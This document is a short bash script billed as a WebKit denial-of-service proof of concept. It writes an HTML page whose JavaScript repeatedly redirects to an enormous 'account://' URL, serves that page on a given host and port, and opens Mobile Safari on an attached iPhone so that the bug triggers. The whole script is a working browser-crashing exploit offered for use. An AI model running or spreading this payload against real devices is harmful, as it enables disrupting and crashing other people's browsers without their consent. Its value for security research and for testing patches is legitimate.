#!/usr/bin/env bash

######################################
##     Webkit Denial of Service     ##
##    Created by Sem Voigtl√§nder    ##
##  Licended under the MIT License  ##
######################################

if [ $# -ne 2 ]; then
  echo "Usage: $0 [LHOST] [LPORT]";
  exit;
fi

IP="$1"
PORT="$2"
mkdir -p /tmp/wk_09_2018
cd /tmp/wk_09_2018
touch index.html
echo "<script type='text/javascript'>setInterval(function(){window.location.href='account://'.repeat(100000);},100);</script>" > index.html
echo "Please visit http://$IP:$PORT/ on your iPhone to trigger the bug."
python -m SimpleHTTPServer "$IP:$PORT" &
idevicedebug -d run com.apple.mobilesafari

